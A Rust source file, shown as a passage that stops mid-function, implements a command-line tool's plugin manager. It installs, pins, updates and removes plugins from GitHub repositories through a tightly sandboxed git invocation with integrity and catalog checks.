//! Plugins from git: check, add, update, remove. Runs in the user's process, never in the server's sandbox.

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};
use std::process::Stdio;

use serde::{Deserialize, Serialize};

use crate::agents::{Check, Manifest};
use crate::plugins::Ability;

/// Where each plugin installed from git came from; copied to another Mac, it installs the same commits.
pub const LOCK: &str = "plugins.lock";
/// Plugins turned off on this Mac, and why; never copied with the lock.
pub const OFF: &str = "plugins-off.json";
const STAGING: &str = "plugin-staging";
/// The first git with the clone fixes for CVE-2024-32002 and CVE-2024-32004.
const GIT_MIN: (u32, u32, u32) = (2, 45, 1);

#[derive(Serialize, Deserialize, Clone, Debug, PartialEq, Eq)]
pub struct Pin {
    pub name: String,
    pub source: String,
    #[serde(default)]
    pub tag: Option<String>,
    pub commit: String,
}

/// `nerd --plugin-check <dir> [--catalog] [--json]`: 0 clean, 1 a problem found, 2 a usage error.
pub fn check_main(args: &[String]) -> std::io::Result<()> {
    let (flags, dirs): (Vec<&String>, Vec<&String>) = args.iter().partition(|a| a.starts_with("--"));
    if dirs.len() != 1 || flags.iter().any(|f| !["--catalog", "--json"].contains(&f.as_str())) {
        eprintln!("usage: nerd --plugin-check <folder> [--catalog] [--json]");
        std::process::exit(2);
    }
    let has = |f: &str| flags.iter().any(|x| *x == f);
    let c = crate::agents::check_folder(Path::new(dirs[0]), has("--catalog"));
    if has("--json") {
        println!("{}", serde_json::to_string_pretty(&c).map_err(std::io::Error::other)?);
    } else {
        print!("{}", report(&c));
    }
    if !c.problems.is_empty() {
        std::process::exit(1);
    }
    Ok(())
}

/// The check in words: what it is, what it can do, then what is wrong with it.
pub fn report(c: &Check) -> String {
    // A manifest's text is a stranger's until it passed the rules; escapes must not reach the terminal.
    let u = crate::render::unspoofed;
    let mut out = format!("{} {}\n", u(&c.name), u(c.version.as_deref().unwrap_or("(no version)")));
    if !c.title.is_empty() {
        out += &format!("{}\n", u(&c.title));
    }
    if !c.platforms.is_empty() {
        out += &format!("Runs on {}\n", u(&c.platforms.join(", ")));
    }
    if c.manifest.is_some() {
        out += &format!("Risk: {}\n", RISK[c.risk as usize]);
        for a in &c.abilities {
            out += &format!("  {}\n", u(a));
        }
    }
    if c.problems.is_empty() {
        out += "No problems found.\n";
    } else {
        for p in &c.problems {
            out += &format!("Problem: {}\n", u(p));
        }
    }
    out
}

pub const RISK: [&str; 4] = ["only shows things", "writes files", "reaches the network", "hooks into an agent"];

fn root() -> PathBuf {
    crate::paths::state_root()
}

/// Each pinned plugin's commit; an unreadable lock is none.
pub fn commits() -> std::collections::HashMap<String, String> {
    read_lock().unwrap_or_default().into_iter().map(|p| (p.name, p.commit)).collect()
}

/// No lock is an empty one; a lock that does not parse is left as it is and stops every change.
pub fn read_lock() -> Result<Vec<Pin>, String> {
    match std::fs::read_to_string(root().join(LOCK)) {
        Ok(t) => serde_json::from_str::<Vec<Pin>>(&t)
            .map_err(|e| format!("{LOCK} does not parse ({e}); fix or move it first"))
            .and_then(|pins| match pins.iter().find(|p| !is_sha(&p.commit)) {
                Some(p) => Err(format!("{LOCK}: {}'s commit is not a commit; fix or move it first", crate::render::unspoofed(&p.name))),
                None => Ok(pins),
            }),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(Vec::new()),
        Err(e) => Err(format!("{LOCK}: {e}")),
    }
}

fn write_lock(pins: &[Pin]) -> Result<(), String> {
    let text = serde_json::to_string_pretty(pins).map_err(|e| e.to_string())? + "\n";
    crate::paths::write_private(&root().join(LOCK), "lock-tmp", text.as_bytes()).map_err(|e| format!("{LOCK}: {e}"))
}

/// Off plugins by name, with the reason; `Err` when the file does not parse, and then no plugin starts.
pub fn read_off() -> Result<BTreeMap<String, String>, String> {
    read_off_at(&root().join(OFF))
}

pub fn read_off_at(path: &Path) -> Result<BTreeMap<String, String>, String> {
    match std::fs::read_to_string(path) {
        Ok(t) => serde_json::from_str(&t).map_err(|e| format!("{OFF} does not parse: {e}")),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(BTreeMap::new()),
        Err(e) => Err(format!("{OFF}: {e}")),
    }
}

fn write_off(off: &BTreeMap<String, String>) -> Result<(), String> {
    let text = serde_json::to_string_pretty(off).map_err(|e| e.to_string())? + "\n";
    crate::paths::write_private(&root().join(OFF), "off-tmp", text.as_bytes()).map_err(|e| format!("{OFF}: {e}"))
}

/// One change at a time across the CLI, panes and the server: held until dropped.
fn guard() -> Result<nix::fcntl::Flock<std::fs::File>, String> {
    let dir = root().join(STAGING);
    std::fs::create_dir_all(&dir).map_err(|e| format!("{}: {e}", dir.display()))?;
    let f = std::fs::OpenOptions::new().create(true).truncate(false).write(true).open(dir.join(".lock")).map_err(|e| e.to_string())?;
    // Never waits: the server calls this on its loop.
    nix::fcntl::Flock::lock(f, nix::fcntl::FlockArg::LockExclusiveNonblock).map_err(|_| "another plugin change is running; try again in a moment".to_string())
}

/// A fresh folder under staging; ones left by a run that died more than a day ago go.
fn stage_dir() -> Result<PathBuf, String> {
    let dir = root().join(STAGING);
    let day = std::time::Duration::from_secs(86_400);
    for e in std::fs::read_dir(&dir).into_iter().flatten().flatten() {
        let old = e.metadata().and_then(|m| m.modified()).ok().and_then(|t| t.elapsed().ok()).is_some_and(|a| a > day);
        if old && e.file_type().is_ok_and(|t| t.is_dir()) {
            let _ = std::fs::remove_dir_all(e.path());
        }
    }
    let nanos = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).map(|d| d.as_nanos()).unwrap_or(0);
    let d = dir.join(format!("{}-{nanos}", std::process::id()));
    std::fs::create_dir_all(&d).map_err(|e| format!("{}: {e}", d.display()))?;
    Ok(d)
}

const SECRET: &str = "an address with a password or token in it: nerd installs public GitHub repositories only";

/// A password or token before the host: any user in an https address, a `user:password` in an ssh one. A token in
/// the address would reach the log and the lock.
pub fn secret_in(url: &str) -> bool {
    let Some(rest) = url.strip_prefix("https://").or_else(|| url.strip_prefix("ssh://")) else { return false };
    let authority = rest.split('/').next().unwrap_or("");
    authority.contains('@') && (url.starts_with("https://") || authority.rsplit_once('@').is_some_and(|(u, _)| u.contains(':')))
}

/// What git is given to fetch: a public repository at `https://github.com/<owner>/<repo>`; a local folder only when
/// `local` (typed in a terminal), for developing a plugin or installing code you checked yourself.
pub fn source(url: &str, local: bool) -> Result<String, String> {
    let bad = || format!("{:?} is not a GitHub repository: nerd installs from https://github.com/<owner>/<repo>", crate::render::unspoofed(url));
    if url.is_empty() || url.starts_with('-') || url.chars().any(|c| c.is_control() || c.is_whitespace()) {
        return Err(bad());
    }
    if secret_in(url) {
        return Err(SECRET.into());
    }
    if let Some(path) = url.strip_prefix("https://github.com/") {
        let (owner, repo) = path.strip_suffix(".git").unwrap_or(path).split_once('/').ok_or_else(bad)?;
        let owner_ok = !owner.is_empty() && owner.len() <= 39 && !owner.starts_with('-') && owner.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'-');
        let repo_ok = !repo.is_empty() && repo.len() <= 100 && repo != "." && repo != ".." && repo.bytes().all(|b| b.is_ascii_alphanumeric() || b"._-".contains(&b));
        return if owner_ok && repo_ok { Ok(url.into()) } else { Err(bad()) };
    }
    if local && (url.starts_with('/') || url.starts_with('.') || url.starts_with("~/")) {
        let p = crate::paths::resolve(&std::env::current_dir().unwrap_or_default(), url);
        return p.canonicalize().ok().filter(|p| p.is_dir()).map(|p| p.to_string_lossy().into_owned()).ok_or_else(|| format!("{} is not a folder", p.display()));
    }
    Err(bad())
}

/// git on PATH, new enough, and never Apple's stub that opens an install dialog; found once, a missing one is looked for again.
fn git_exe() -> Result<PathBuf, String> {
    static FOUND: std::sync::OnceLock<PathBuf> = std::sync::OnceLock::new();
    if let Some(exe) = FOUND.get() {
        return Ok(exe.clone());
    }
    let path = std::env::var("PATH").unwrap_or_default();
    let exe = path.split(':').chain(["/opt/homebrew/bin", "/usr/local/bin", "/usr/bin"]).map(|d| Path::new(d).join("git")).find(|p| p.is_file()).ok_or("git is not installed")?;
    if exe == Path::new("/usr/bin/git") && !crate::spawn::cmd("/usr/bin/xcode-select").arg("-p").stdout(Stdio::null()).stderr(Stdio::null()).status().is_ok_and(|s| s.success()) {
        return Err("git is not installed: run xcode-select --install".into());
    }
    let out = crate::spawn::cmd(&exe).arg("--version").env_remove("GIT_EXEC_PATH").output().map_err(|e| format!("git: {e}"))?;
    let text = String::from_utf8_lossy(&out.stdout);
    let v = text.split_whitespace().nth(2).and_then(|v| {
        let mut p = v.split('.').map(|x| x.parse::<u32>().ok());
        Some((p.next()??, p.next()??, p.next().flatten().unwrap_or(0)))
    });
    match v {
        // Apple's git is asked about each time: removing the Command Line Tools turns it back into the stub.
        Some(v) if v >= GIT_MIN && exe == Path::new("/usr/bin/git") => Ok(exe),
        Some(v) if v >= GIT_MIN => Ok(FOUND.get_or_init(|| exe).clone()),
        _ => Err(format!("{} is older than git {}.{}.{}", text.trim(), GIT_MIN.0, GIT_MIN.1, GIT_MIN.2)),
    }
}

/// Whether git reaches the network.
#[derive(Clone, Copy, PartialEq)]
enum Net {
    No,
    Fetch,
    /// A local folder the user typed.
    FetchLocal,
}

/// Every git nerd runs. Never the user's or the system's config, a home folder (netrc, attributes) or an askpass, so
/// nothing redirects, proxies or authenticates a fetch and a repository's `.gitattributes` cannot name a filter; never
/// hooks, fsmonitor, a pager, a prompt, an inherited `GIT_*` or a proxy or certificate variable.
fn git(net: Net, dir: Option<&Path>, args: &[&str]) -> Result<Vec<u8>, String> {
    // Only a clone fetches: another network subcommand is a new way out of nerd (docs/privacy-and-security.md, "What leaves nerd").
    if net != Net::No && args.first() != Some(&"clone") {
        return Err(format!("git {} may not reach the network", args.first().unwrap_or(&"")));
    }
    let mut cmd = crate::spawn::cmd(git_exe()?);
    for (k, _) in std::env::vars_os() {
        let k = k.to_string_lossy();
        if k.starts_with("GIT_") || k.eq_ignore_ascii_case("http_proxy") || k.eq_ignore_ascii_case("https_proxy") || k.eq_ignore_ascii_case("all_proxy") || k.eq_ignore_ascii_case("no_proxy") || ["SSL_CERT_FILE", "SSL_CERT_DIR", "CURL_CA_BUNDLE", "XDG_CONFIG_HOME", "SSH_ASKPASS", "SSH_ASKPASS_REQUIRE"].contains(&k.as_ref()) {
            cmd.env_remove(k.as_ref());
        }
    }
    cmd.env("HOME", "/var/empty").env("GIT_CONFIG_GLOBAL", "/dev/null").env("GIT_CONFIG_NOSYSTEM", "1").env("GIT_TERMINAL_PROMPT", "0");
    cmd.args(["--no-pager", "-c", "core.hooksPath=/dev/null", "-c", "core.fsmonitor=false", "-c", "protocol.allow=never"]);
    if net != Net::No {
        cmd.args(["-c", "transfer.fsckObjects=true", "-c", "protocol.https.allow=always"]);
        if net == Net::FetchLocal {
            cmd.args(["-c", "protocol.file.allow=always"]);
        }
    }
    if let Some(d) = dir {
        cmd.arg("-C").arg(d);
    }
    cmd.args(args);
    cmd.stdin(Stdio::null()).stdout(Stdio::piped()).stderr(Stdio::piped());
    crate::log::info(&format!("git {}", args.iter().map(|a| crate::render::unspoofed(a)).collect::<Vec<_>>().join(" ")));
    let out = cmd.output().map_err(|e| format!("git: {e}"))?;
    if out.status.success() {
        return Ok(out.stdout);
    }
    let err = String::from_utf8_lossy(&out.stderr);
    if WINDOW.load(std::sync::atomic::Ordering::Relaxed) {
        err.lines().for_each(|l| eprintln!("{}", crate::render::unspoofed(l)));
    }
    let last = err.lines().map(str::trim).rfind(|l| !l.is_empty()).unwrap_or("failed");
    let said = if net == Net::No { last.to_string() } else { crate::plugin_list::failure(last) };
    Err(format!("git {}: {}", args.first().unwrap_or(&""), crate::render::unspoofed(&said)))
}

fn text(b: Vec<u8>) -> String {
    String::from_utf8_lossy(&b).trim().to_string()
}

fn is_sha(s: &str) -> bool {
    s.len() == 40 && s.bytes().all(|b| b.is_ascii_digit() || (b'a'..=b'f').contains(&b))
}

/// A release tag, `v1.2.3` or `1.2.3`, as its version.
fn tag_version(tag: &str) -> Option<crate::agents::Semver<'_>> {
    crate::agents::semver(tag.strip_prefix('v').unwrap_or(tag))
}

/// The commit to install: `at` (a tag or a full commit), else the newest release tag above `above` whose
/// manifest this nerd can run; pre-releases only when named. `None`: nothing newer.
fn pick(repo: &Path, at: Option<&str>, above: Option<(u32, u32, u32)>) -> Result<Option<(Option<String>, String)>, String> {
    let commit = |r: &str| git(Net::No, Some(repo), &["rev-parse", "--verify", "--quiet", "--end-of-options", &format!("{r}^{{commit}}")]).map(text);
    if let Some(at) = at {
        if is_sha(at) {
            return commit(at).map(|c| Some((None, c))).map_err(|_| format!("{at} is not a commit there"));
        }
        if at.starts_with('-') || !at.bytes().all(|b| b.is_ascii_alphanumeric() || b"._-/".contains(&b)) {
            return Err(format!("{:?} is not a tag name", crate::render::unspoofed(at)));
        }
        return commit(&format!("refs/tags/{at}")).map(|c| Some((Some(at.to_string()), c))).map_err(|_| format!("no tag {at} there"));
    }
    let tags = text(git(Net::No, Some(repo), &["tag", "--list"])?);
    let mut releases: Vec<((u32, u32, u32), &str)> =
        tags.lines().filter_map(|t| tag_version(t).filter(|(_, pre)| pre.is_none()).map(|(v, _)| (v, t))).filter(|(v, _)| above.is_none_or(|a| *v > a)).collect();
    releases.sort();
    for (_, tag) in releases.into_iter().rev() {
        let c = commit(&format!("refs/tags/{tag}"))?;
        let manifest = git(Net::No, Some(repo), &["show", &format!("{c}:plugin.json")]).ok().and_then(|b| serde_json::from_slice::<Manifest>(&b).ok());
        if manifest.is_some_and(|m| m.min_nerd.as_deref().is_none_or(crate::agents::nerd_meets)) {
            return Ok(Some((Some(tag.to_string()), c)));
        }
    }
    if above.is_some() {
        return Ok(None);
    }
    Err("no release tag this nerd can run (v1.2.3 or 1.2.3); name a commit with @<its 40 characters>".into())
}

/// Read before anything is written to disk: no submodule, no link out of the folder, no oversized file.
fn inspect(repo: &Path, commit: &str) -> Result<(), String> {
    let list = git(Net::No, Some(repo), &["ls-tree", "-r", "-l", "-z", "--full-tree", commit])?;
    for entry in list.split(|b| *b == 0).filter(|e| !e.is_empty()) {
        let entry = String::from_utf8_lossy(entry);
        let (meta, path) = entry.split_once('\t').ok_or("git ls-tree: unexpected output")?;
        let f: Vec<&str> = meta.split_whitespace().collect();
        let [mode, _, object, size] = f.as_slice() else { return Err("git ls-tree: unexpected output".into()) };
        let shown = crate::render::unspoofed(path);
        if *mode == "160000" {
            return Err(format!("{shown} is a submodule; a plugin is one repository"));
        }
        if *mode == "120000" {
            let target = String::from_utf8_lossy(&git(Net::No, Some(repo), &["cat-file", "blob", object])?).into_owned();
            if !stays_inside(path, &target) {
                return Err(format!("{shown} links outside the plugin's folder"));
            }
        }
        if size.parse::<u64>().is_ok_and(|s| s > crate::agents::FILE_MAX) {
            return Err(format!("{shown} is over {} MB", crate::agents::FILE_MAX >> 20));
        }
    }
    Ok(())
}

/// Whether a link at `path` (relative to the folder) pointing at `target` stays inside the folder.
fn stays_inside(path: &str, target: &str) -> bool {
    if target.starts_with('/') {
        return false;
    }
    let mut depth = path.split('/').count() as i64 - 1;
    for part in target.split('/') {
        match part {
            "" | "." => {}
            ".." => depth -= 1,
            _ => depth += 1,
        }
        if depth < 0 {
            return false;
        }
    }
    true
}

/// A plugin fetched, inspected, checked out and checked in staging, not yet placed; its folder goes when dropped
/// unless `keep` (a pane leaves it for the Plugins window).
pub struct Staged {
    pub dir: PathBuf,
    pub pin: Pin,
    pub check: Check,
    pub keep: bool,
}

impl Staged {
    fn empty(dir: PathBuf, source: &str, keep: bool) -> Staged {
        Staged { dir, pin: Pin { name: String::new(), source: source.into(), tag: None, commit: String::new() }, check: Check::default(), keep }
    }

    pub fn tree(&self) -> PathBuf {
        self.dir.join("repo")
    }
}

impl Drop for Staged {
    fn drop(&mut self) {
        if !self.keep {
            let _ = std::fs::remove_dir_all(&self.dir);
        }
    }
}

/// Fetch `source` into staging and check the chosen commit; `above` takes only a newer release.
fn stage(source: &str, net: Net, at: Option<&str>, above: Option<(u32, u32, u32)>) -> Result<Option<Staged>, String> {
    let s = Staged::empty(stage_dir()?, source, false);
    let repo = s.tree();
    git(net, None, &["clone", "--no-checkout", "--quiet", "--", source, &repo.to_string_lossy()])?;
    let Some((tag, commit)) = pick(&repo, at, above)? else { return Ok(None) };
    inspect(&repo, &commit)?;
    git(Net::No, Some(&repo), &["checkout", "--quiet", "--detach", &commit])?;
    verify(s, source, tag, commit).map(Some)
}

/// The checked-out tree passes the loader's rules and its version is its tag's.
fn verify(mut s: Staged, source: &str, tag: Option<String>, commit: String) -> Result<Staged, String> {
    s.check = crate::agents::check_folder(&s.tree(), false);
    match (&s.check.version, &tag) {
        (None, _) if s.check.manifest.is_some() => s.check.problems.push("a plugin installed from git needs a version".into()),
        (Some(v), Some(t)) if v != t.strip_prefix('v').unwrap_or(t) => s.check.problems.push(format!("its version {v} is not its tag {t}")),
        _ => {}
    }
    let (catalog, _) = crate::catalog::read();
    if let Some(r) = catalog.revoked(&s.check.name, &commit).filter(|r| r.level == "hard") {
        s.check.problems.push(format!("the catalog revoked this release: {}", crate::render::unspoofed(&r.why)));
    }
    // The catalog's risk level is never taken on trust: it must be what the manifest gives.
    if let Some(e) = catalog.by_url(source).filter(|e| e.commit == commit && e.risk != s.check.risk) {
        s.check.problems.push(format!("the catalog says it {}, its manifest says it {}", RISK[e.risk.min(3) as usize], RISK[s.check.risk as usize]));
    }
    if !s.check.problems.is_empty() {
        return Err(report(&s.check));
    }
    s.pin = Pin { name: s.check.name.clone(), source: source.into(), tag, commit };
    Ok(s)
}

/// A catalog plugin installs the release the catalog reviewed: its tag must still be that commit.
fn reviewed(s: Staged, e: &crate::catalog::Entry) -> Result<Staged, String> {
    if s.pin.commit != e.commit {
        return Err(format!("the author moved or removed the reviewed release {}; nothing was installed", e.tag));
    }
    Ok(s)
}

/// A repository's default branch as files only, inspected like a plugin's, put in place of `into`.
pub fn fetch_tree(url: &str, local: bool, into: &Path) -> Result<(), String> {
    let src = source(url, local)?;
    let s = Staged::empty(stage_dir()?, &src, false);
    let repo = s.tree();
    git(net_for(&src), None, &["clone", "--no-checkout", "--quiet", "--depth", "1", "--", &src, &repo.to_string_lossy()])?;
    let commit = text(git(Net::No, Some(&repo), &["rev-parse", "--verify", "HEAD^{commit}"])?);
    inspect(&repo, &commit)?;
    git(Net::No, Some(&repo), &["checkout", "--quiet", "--detach", &commit])?;
    std::fs::remove_dir_all(repo.join(".git")).map_err(|e| e.to_string())?;
    let _g = guard()?;
    let placed = if into.exists() { swap(&repo, into) } else { std::fs::rename(&repo, into) };
    placed.map_err(|e| format!("{}: {e}", into.display()))?;
    crate::log::info(&format!("catalog fetched from {src} at {commit}"));
    Ok(())
}

fn net_for(source: &str) -> Net {
    if source.starts_with('/') { Net::FetchLocal } else { Net::Fetch }
}

fn not_installed(name: &str) -> Result<(), String> {
    if root().join("plugins").join(name).exists() || read_lock()?.iter().any(|p| p.name == name) {
        return Err(format!("{name} is installed already; nerd --plugin-update {name} updates it"));
    }
    Ok(())
}

/// Fetch and check a plugin to add; nothing is placed yet.
pub fn stage_add(url: &str, at: Option<&str>, local: bool) -> Result<Staged, String> {
    let src = source(url, local)?;
    let (catalog, _) = crate::catalog::read();
    let entry = catalog.by_url(&src).filter(|_| at.is_none());
    let s = stage(&src, net_for(&src), at.or(entry.map(|e| e.tag.as_str())), None)?.ok_or("nothing to install")?;
    let s = match entry {
        Some(e) => reviewed(s, e)?,
        None => s,
    };
    not_installed(&s.pin.name)?;
    Ok(s)
}

/// The staged release, the commits since the installed one, and what it can do now that it could not.
pub type Update = (Staged, Vec<String>, Vec<Ability>);

/// An installed plugin's newest release above its own; `None` when it has none.
pub fn stage_update(name: &str) -> Result<Option<Update>, String> {
    named(name)?;
    let pin = pinned(name)?;
    // A lock line from before nerd took GitHub only, or edited by hand, fetches from nowhere else.
    if !pin.source.starts_with('/') && source(&pin.source, false).is_err() {
        return Err(format!("{name} was installed from {}; nerd installs from GitHub only: remove it and add it from GitHub", crate::render::unspoofed(&pin.source)));
    }
    let old = crate::agents::check_folder(&root().join("plugins").join(name), false);
    let above = pin.tag.as_deref().and_then(tag_version).or(old.version.as_deref().and_then(crate::agents::semver)).map(|(v, _)| v).unwrap_or((0, 0, 0));
    // From the catalog, an update is the catalog's next reviewed release, never an upstream tag it has not seen.
    let (catalog, _) = crate::catalog::read();
    let s = match catalog.by_url(&pin.source) {
        Some(e) if tag_version(&e.tag).is_some_and(|(v, _)| v > above) => Some(reviewed(stage(&pin.source, net_for(&pin.source), Some(&e.tag), None)?.ok_or("nothing to install")?, e)?),
        Some(_) => None,
        None => stage(&pin.source, net_for(&pin.source), None, Some(above))?,
    };
    let Some(s) = s else { return Ok(None) };
    let (log, new) = since(&s, &pin, &old)?;
    Ok(Some((s, log, new)))
}

fn pinned(name: &str) -> Result<Pin, String> {
    read_lock()?.into_iter().find(|p| p.name == name).ok_or_else(|| format!("{name} was not installed from git, so it has nothing to update from"))
}

/// The commits from the installed one to the staged one, and the abilities the installed one lacks.
fn since(s: &Staged, pin: &Pin, old: &Check) -> Result<(Vec<String>, Vec<Ability>), String> {
    if s.pin.name != pin.name {
        return Err(format!("the new release is named {}, not {}", s.pin.name, pin.name));
    }
    let range = format!("{}..{}", pin.commit, s.pin.commit);
    let log = match git(Net::No, Some(&s.tree()), &["log", "--oneline", "--no-decorate", "-n", "50", &range, "--"]) {
        Ok(b) => text(b).lines().map(crate::render::unspoofed).collect(),
        Err(_) => vec!["The installed commit is no longer in its history: it was rewritten.".into()],
    };
    Ok((log, crate::plugins::new_abilities(&s.check.found, &old.found)))
}

/// When the lock and the off file last changed: a running server looks again when either does.
pub fn seen() -> [Option<std::time::SystemTime>; 2] {
    [LOCK, OFF].map(|f| std::fs::metadata(root().join(f)).and_then(|m| m.modified()).ok())
}

/// Plugins a pane fetched and left for the Plugins window, oldest first.
pub fn ready_ids() -> Vec<String> {
    let mut ids: Vec<String> = std::fs::read_dir(root().join(STAGING)).into_iter().flatten().flatten().filter(|e| e.path().join("ready.json").is_file()).map(|e| e.file_name().to_string_lossy().into_owned()).collect();
    ids.sort();
    ids
}

fn ready_dir(id: &str) -> Result<PathBuf, String> {
    if id.is_empty() || !id.bytes().all(|b| b.is_ascii_digit() || b == b'-') {
        return Err(format!("{id:?} is not a staged plugin"));
    }
    Ok(root().join(STAGING).join(id))
}

/// A staged plugin as the server sees it: the pane's `ready.json` only points at the tree; commit, abilities and
/// what is new are read from the tree and the installed plugin here.
pub struct Ready {
    /// The catalog's word on this exact release, in a sentence.
    pub words: String,
    pub update: bool,
    pub staged: Staged,
    pub log: Vec<String>,
    pub new: Vec<Ability>,
}

pub fn load_ready(id: &str, keep: bool) -> Result<Ready, String> {
    let dir = ready_dir(id)?;
    let told: serde_json::Value = std::fs::read(dir.join("ready.json")).ok().and_then(|b| serde_json::from_slice(&b).ok()).ok_or("its ready.json does not parse")?;
    let s = Staged::empty(dir, "", keep);
    let repo = s.tree();
    let update = told["op"] == "update";
    // A folder only for an update: it must then be the one the plugin was installed from, checked below.
    let source = told["source"].as_str().filter(|u| source(u, update).is_ok()).ok_or("it names no GitHub repository")?.to_string();
    let tag = told["tag"].as_str().map(String::from);
    let commit = text(git(Net::No, Some(&repo), &["rev-parse", "--verify", "HEAD^{commit}"])?);
    if !text(git(Net::No, Some(&repo), &["status", "--porcelain", "--untracked-files=all", "--ignored"])?).is_empty() {
        return Err("its files were changed after they were fetched".into());
    }
    if let Some(t) = &tag
        && text(git(Net::No, Some(&repo), &["rev-parse", "--verify", "--end-of-options", &format!("refs/tags/{t}^{{commit}}")])?) != commit
    {
        return Err(format!("its tag {t} is not the commit it holds"));
    }
    let s = verify(s, &source, tag, commit)?;
    let words = catalog_words(&crate::catalog::read().0, &s.pin);
    if !update {
        not_installed(&s.pin.name)?;
        return Ok(Ready { words, update, staged: s, log: Vec::new(), new: Vec::new() });
    }
    let pin = pinned(&s.pin.name)?;
    if pin.source != s.pin.source {
        return Err(format!("it says it comes from {}, but {} was installed from {}", crate::render::unspoofed(&s.pin.source), pin.name, crate::render::unspoofed(&pin.source)));
    }
    let old = crate::agents::check_folder(&root().join("plugins").join(&pin.name), false);
    let (log, new) = since(&s, &pin, &old)?;
    Ok(Ready { words, update, staged: s, log, new })
}

/// Places a staged plugin after the Plugins window was answered yes.
pub fn finish_ready(r: Ready) -> Result<String, String> {
    let name = r.staged.pin.name.clone();
    if r.update {
        apply_update(r.staged)?;
        Ok(format!("updated {name}"))
    } else {
        place(r.staged)?;
        Ok(format!("installed {name}"))
    }
}

/// Answered no, or not loadable: the staged files go.
pub fn discard(id: &str) {
    if let Ok(d) = ready_dir(id) {
        let _ = std::fs::remove_dir_all(d);
    }
}

/// Put a staged plugin in place: its lock line first, so a folder never sits there without one.
pub fn place(s: Staged) -> Result<(), String> {
    let _g = guard()?;
    let mut pins = read_lock()?;
    let dst = root().join("plugins").join(&s.pin.name);
    if dst.exists() || pins.iter().any(|p| p.name == s.pin.name) {
        return Err(format!("{} is installed already", s.pin.name));
    }
    std::fs::remove_dir_all(s.tree().join(".git")).map_err(|e| e.to_string())?;
    std::fs::create_dir_all(root().join("plugins")).map_err(|e| e.to_string())?;
    pins.push(s.pin.clone());
    write_lock(&pins)?;
    if let Err(e) = std::fs::rename(s.tree(), &dst) {
        pins.pop();
        write_lock(&pins)?;
        return Err(format!("{}: {e}", dst.display()));
    }
    // Again, now the tree is in place: a server that looked in between sees the change.
    write_lock(&pins)?;
    crate::log::info(&format!("plugin added: {} from {} at {}", s.pin.name, s.pin.source, s.pin.commit));
    Ok(())
}

/// Swap the installed tree for the staged one in one step; nerd's hooks leave an agent config the new one no longer uses.
pub fn apply_update(s: Staged) -> Result<(), String> {
    let _g = guard()?;
    let mut pins = read_lock()?;
    let dst = root().join("plugins").join(&s.pin.name);
    let old = crate::agents::check_folder(&dst, false).manifest;
    let i = pins.iter().position(|p| p.name == s.pin.name).ok_or("its lock line is gone")?;
    pins[i] = s.pin.clone();
    std::fs::remove_dir_all(s.tree().join(".git")).map_err(|e| e.to_string())?;
    // The old line stays until the new tree is in: a server that looked in between would restart the old code under the new commit.
    swap(&s.tree(), &dst).map_err(|e| format!("{}: {e}", dst.display()))?;
    if let Err(e) = write_lock(&pins) {
        // Swapped back, so the folder holds what its lock line still names.
        let _ = swap(&s.tree(), &dst);
        return Err(e);
    }
    // Only the catalog's own current release lifts a revocation, never an upstream tag it has not seen.
    let (catalog, _) = crate::catalog::read();
    let lifted = catalog.entries.iter().any(|e| e.name == s.pin.name && e.url == s.pin.source && e.commit == s.pin.commit) && catalog.revoked(&s.pin.name, &s.pin.commit).is_none();
    let mut off = read_off()?;
    if lifted && off.get(&s.pin.name).is_some_and(|r| r.starts_with("revoked")) {
        off.remove(&s.pin.name);
        write_off(&off)?;
    }
    let config = |m: Option<&Manifest>| m.and_then(|m| m.agent.config.as_ref().map(|c| c.path.clone()));
    if let Some(old) = &old
        && config(Some(old)) != config(s.check.manifest.as_ref())
    {
        let _ = crate::hook::unhook(old);
    }
    crate::log::info(&format!("plugin updated: {} to {}", s.pin.name, s.pin.commit));
    Ok(())
}

fn swap(a: &Path, b: &Path) -> std::io::Result<()> {
    use std::os::unix::ffi::OsStrExt as _;
    let c = |p: &Path| std::ffi::CString::new(p.as_os_str().as_bytes()).map_err(std::io::Error::other);
    let (a, b) = (c(a)?, c(b)?);
    if unsafe { nix::libc::renamex_np(a.as_ptr(), b.as_ptr(), nix::libc::RENAME_SWAP) } == 0 { Ok(()) } else { Err(std::io::Error::last_os_error()) }
}

/// A plugin's name as the loader allows it: never a path or a flag.
fn named(name: &str) -> Result<(), String> {
    let ok = !name.is_empty() && name.len() <= 64 && !name.starts_with('-') && name.bytes().all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'-');
    if ok { Ok(()) } else { Err(format!("{:?} is not a plugin's name", crate::render::unspoofed(name))) }
}

/// Moved out of `plugins/` before the lock changes, so a reload never starts it again; `data` also deletes its data.
pub fn remove(name: &str, data: bool) -> Result<(), String> {
    named(name)?;
    let _g = guard()?;
    let mut pins = read_lock()?;
    let dir = root().join("plugins").join(name);
    if !dir.is_dir() {
        return Err(format!("{name} is not installed"));
    }
    if let Some(m) = crate::agents::check_folder(&dir, false).manifest {
        let _ = crate::hook::unhook(&m);
    }
    let out = stage_dir()?;
    std::fs::rename(&dir, out.join(name)).map_err(|e| format!("{}: {e}", dir.display()))?;
    pins.retain(|p| p.name != name);
    write_lock(&pins)?;
    if let Ok(mut off) = read_off()
        && off.remove(name).is_some()
    {
        write_off(&off)?;
    }
    let _ = std::fs::remove_dir_all(&out);
    if data {
        let _ = std::fs::remove_dir_all(crate::plugins::data_dir(name));
    }
    crate::log::info(&format!("plugin removed: {name}{}", if data { ", with its data" } else { "" }));
    Ok(())
}

/// Off stays off until turned on; a revoked plugin comes back only by an update to the catalog's current release.
pub fn turn(name: &str, on: bool, reason: &str) -> Result<(), String> {
    named(name)?;
    let _g = guard()?;
    let mut off = read_off()?;
    let dir = root().join("plugins").join(name);
    if on {
        if off.get(name).is_some_and(|r| r.starts_with("revoked")) {
            return Err(format!("{name} was revoked by the catalog; update it to the catalog's current release, or remove it"));
        }
        off.remove(name);
        if let Some(m) = crate::agents::check_folder(&dir, false).manifest {
            crate::hook::rehook(&m);
        }
    } else {
        if !dir.is_dir() {
            return Err(format!("{name} is not installed"));
        }
        if let Some(m) = crate::agents::check_folder(&dir, false).manifest {
            let _ = crate::hook::unhook(&m);
        }
        // Turning a revoked plugin off must not turn the revocation into an ordinary off.
        if !off.get(name).is_some_and(|r| r.starts_with("revoked")) || reason.starts_with("revoked") {
            off.insert(name.into(), reason.into());
        }
    }
    write_off(&off)?;
